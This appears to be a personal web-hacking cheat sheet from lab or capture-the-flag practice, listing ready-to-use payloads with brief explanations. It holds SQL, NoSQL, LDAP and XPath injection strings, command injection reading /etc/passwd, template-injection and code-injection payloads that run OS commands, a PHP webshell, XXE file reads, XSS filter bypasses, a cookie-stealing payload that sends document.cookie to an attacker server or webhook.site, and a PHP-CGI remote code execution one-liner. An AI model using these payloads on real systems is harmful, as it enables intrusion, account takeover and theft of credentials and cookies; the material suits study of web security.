# john- the -ripper password cracking password
DES is weakest encryption

john filename --format=descrypt



algorithm used to hash the password: MD5 is used. It can be detected by the prefix of the password: $1$.

If you look at other files, you can tell that:

if the hash starts by $2$ or $2a$, Blowfish is used;
if the hash starts by $5$, SHA-256 is used;
if the hash starts by $6$, SHA-512 is used.
For MD5, You can use the format: md5crypt to crack this password.


$1$sEG2hoXa$ElTBuZIfwEzSiA9zkJhwx.:18421:0:99999:7:::


---------------------------------------------------------------------------------------------------------------------------------------------------


 $ mysql -u root
Once you get access to the database, you should be able to navigate it using the following queries:

show databases;
use [DATABASE];
show tables;
select * from [TABLE];
Where [DATABASE] and [TABLE] should be replaced by the value from the previous queries.



MySQL : admin == Admin
admin = admin[space]

---------------------------------------------------------------------------------------------------------------------------------------------------

Code injection:-

Try putting single or double quotes in url to cause error and find out the type of web app, python,ruby etc.

Now, we need to make sure it's a Python application, we can for example use:
"%2bstr(True)%2b"test. The fact that both str() and True are available give us a pretty good chance that Python is used. For the rest of the challenge we will put our payload inside of the call to str()


%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgN2JmNzgyNmMtYTg0MC00OGFmLWIzNGQtZTM2NzM5MmRlOWEzCg==')).read())%2b"

---------------------------------------------------------------------------------------------------------------------------------------------------
command injection

If you look at how the command line works, you can find that there is multiple way to add more commands:

command1 && command2 that will run command2 if command1 succeeds.
command1 || command2 that will run command2 if command1 fails.
command1 ; command2 that will run command1 then command2.
command1 | command2 that will run command1 and send the output of command1 to command2.

...
In this application, we can provide a parameter to command1, but there is no command2. What we are going to do is add our own command. Instead of sending the [parameter] to the command:

ping 127.0.0.1

Where 127.0.0.1 is our [parameter]. We are going to send a malicious [parameter] that will contain another command:

ping 127.0.0.1 ; cat /etc/passwd
The application will think that 127.0.0.1 ; cat /etc/passwd is just a parameter to run command1. But we actually injected command2: cat /etc/passwd.

we can use ping `command`
or ping $(command)
---------------------------------------------------------------------------------------------------------------------------------------------------




File inclusion 

use null byte to hide extention
---------------------------------------------------------------------------------------------------------------------------------------------------

LDAP


ORIGINAL

http://ptc-ba1a184b-92cf7abb.libcurl.so/?name=admin&password=admin

EDITED

http://ptc-ba1a184b-92cf7abb.libcurl.so/?name=admin)(cn=*))%00&password=admin


inject inside [INPUT1] (the username parameter). We will need to inject:

The end of the current filter using hacker).
An always-true condition ((cn=*) for example)
A ) to keep a valid syntax and close the first (.
A NULL BYTE (%00) to get rid of the end of the filter.


The most common pattern of LDAP injection is to be able to inject in a filter. Here, we will see how you can use LDAP injection to bypass an authentication check.

First, you need to learn a bit of LDAP syntax. When you are retrieving a user, based on its username, the following will be used:

(cn=[INPUT])
If you want to add more conditions and some boolean logic, you can use:

A boolean OR using |: (|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2].
A boolean AND using &: (&(cn=[INPUT1])(userPassword=[INPUT2])) to get records for which the cn matches [INPUT1] and the password matches [INPUT2].
As you can see, the boolean logic is located at the beginning of the filter. Since you're likely to inject after it, it's not always possible (depending on the LDAP server) to inject logic inside the filter, if it's just (cn=[INPUT]).

LDAP uses the wildcard * character very often, to match any values. This can be used for match everything * or just substrings (for example, adm* for all words starting with adm).

As with other injections, we will need to remove anything added by the server-side code. We can get rid of the end of the filter, using a NULL BYTE (encoded as %00).

Here, we have a login script. We can see that if we use:

username=hacker&password=hacker we get authenticated (this is the normal request).
username=hack*&password=hacker we get authenticated (the wildcard matches the same value).
username=hacker&password=hac* we don't get authenticated (the password may likely be hashed).
Now, we will see how we can use the LDAP injection, in the username parameter to bypass the authentication. Based on our previous tests, we can deduce that the filter probably looks like:

(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))
Where HASH is an unsalted hash (probably MD5 or SHA1).

LDAP supports several formats: `{CLEARTEXT}`, `{MD5}`, `{SMD5}` (salted MD5), `{SHA}`, `{SSHA}` (salted SHA1), `{CRYPT}` for storing passwords.

---------------------------------------------------------------------------------------------------------------------------------------------------



Mongo DB injection




This example is the MongoDB version of the (in)famous ' or 1=1 --. If you remember what you saw previously, you know that you will need two things to bypass this login for:

An always true condition.
A way to correctly terminate the NoSQL query.
First, by reading MongoDB documentation you can find that the SQL or 1=1 translates to || 1==1 (note the double =). Then by poking around, you can see that a NULL BYTE will prevent MongoDB from using the rest of the query. In some cases, You can also use the comments // or <!-- to comment out the end of the query.

http://ptc-f1fe02bd-1ccbae5f.libcurl.so/?username=' || 1==1%00&password=admin&submit=Submit


---------------------------------------------------------------------------------------------------------------------------------------------------

SQL injection

' OR 1=1 #
" OR 1=1 #
' OR 1=1 --
' OR 1=1 --
(THE QUOTES HERE CLOSE THE USERNAME PARAMETER AND MAKE ANOTHER PARAMETER WHICH IS ALWAYS TRUE)

IF TOO MANY ACCOUNTS ARE OUTPUTTED USE LIMIT

' OR 1=1 LIMIT 1 #

Sometimes space is stripped, so we can use tab insteads
if both spaces and tabs are blocked then we can use

'||1=1#

if ' is escaped ie ' => '\ then we need to Use the string \xBF' (URL-encoded as %bf%27), it's possible to get a single quote that will not get escaped properly. It's therefore possible to inject an always-true condition using %bf%27 or 1=1 -- and bypass the authentication.

bypassing WAF

'/**/union/**/select 1,username,password,4,5 from user-- -



_________________________________________________________________________________________________________________________________________________

SERVERSIDE REQUEST FORGERY



POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this situation, an attacker can modify the request to specify a URL local to the server itself. For example:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin

___________________________________________________________________________________________________________________________________________________


Server Side Template Injection

Flask injection

{{''.__class__.mro()[2].__subclasses__()[233]("command",shell=True,stdout=-1).communicate()[0]}}


{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}

try to change the integers and commands

Twig injection

{{_self.env.registerUndefinedFilterCallback(%27exec%27)}}{{_self.env.getFilter('command')}}

---------------------------------------------------------------------------------------------------------------------------------------------------

File Upload

basic php webshell

<?php
  system($_GET["cmd"]);
?>

___________________________________________________________________________________________________________________________________________________

XML Attacks

?xml=<!DOCTYPE test [ <!ENTITY x SYSTEM "file:///pentesterlab.key">]><test>%26x;</test>

// we need to encode & as %26

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>

 

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>




XPATH injection

given this : - http://ptc-8796c137-d40a6fe8.libcurl.so/?name=hacker&password=pentesterlab

if we need the key we can perform this injection

http://ptc-8796c137-d40a6fe8.libcurl.so/?name=hacker' or 1=1]/parent::*/child::node()%00&password=pentesterlab

or to see the password of admin we can 

http://ptc-8796c137-d40a6fe8.libcurl.so/?name=admin']/parent::*/password%00



___________________________________________________________________________________________________________________________________________________

XSS injection

<script>alert(1)</script>

* if script is filtered

<sCript>alert(1)</sCript>

pentest<script>lab => pentesterlab            therefore    <scr<script>ipt>alert(1)</scr</script>ipt>

<a onmouseover = 'alert(1)'>TEXT</a>

<a onmouseout  = 'alert(1)'>TEXT</a>

<a onmousemove = 'alert(1)'>TEXT</a> 

<a href='javascript:alert(1)'>TEXT</a>

<img src='zzzz' onerror='alert(1)'></img>

<div onmouseover = 'alert(1)'>TEXT</div>

<div onmouseout  = 'alert(1)'>TEXT</div>

<div onmousemove = 'alert(1)'>TEXT</div> 

* alert is filtered

<script>eval("al"%2b"ert(%277bf7826c-a840-48af-b34d-e367392de9a3%27)")</script>
// al %2b ert => alert

<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

// String.fromCharCode(97,108,101,114,116,40,49,41) => alert(1)

___________________________________________________________________________

always take a look at the source code and try to close the previous parameters and write your own parameters

source code may have 

var $a='hacker';

payload

/index.php?name=hacker';alert(1);var $b='

now we have 

var $a = 'hacker';alert(1);var $b='';

________________________________________________________________________________________

to retrieve the victim's cookie:-

* Use your own server
* Use webhook.site

To get the cookie, you will use JavaScript. Your JavaScript code will retrieve the victim's cookies with document.cookie. Then you will add the value to a <img tag to send it to your website (or webhook.site).

Your payload should look like:

<script>document.write('<img src="[URL]?c='%2bdocument.cookie%2b" />');</script>

// + => %2b

-----------------------------------------------------------------------------------------------------------------------------------------------

SQLmap

First we need to intercept a request made to the search feature using BurpSuite.
Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

sqlmap -r request.txt --dbms=mysql --dump

-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database
___________________________________________________________________________________________________________________________________________

After sshing into a network try to use a tool called ss to investigate sockets running on a host.

If we run ss -tulpn it will tell us what socket connections are running

Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names

_____________________________________________________________________________________________________________________


To acess source code of websites:-

?file=php://filter/convert.base64-encode/resource=/var/www/html/*filename*

_____________________________________________________________________________________________________________________

CVE-2014-6271

This vulnerability impacts the Bourne Again Shell "Bash". Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface "CGI".


_____________________________________________________________________________________________________________________

jwt alg none
_____________________________________________________________________________________________________________________

double decoding => . => %2e => %252e


_____________________________________________________________________________________________________________________

unserialize PHP Vulnerablity

php > ('abdsvdfsv4gsrgeg43fds' == 0) //Loose Comparision


Vulnerability CGI PHP Code execution; payload:- echo "<?php system ('cat /flag.txt'); ?>" | POST "http://jh2i.com:50008/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" 




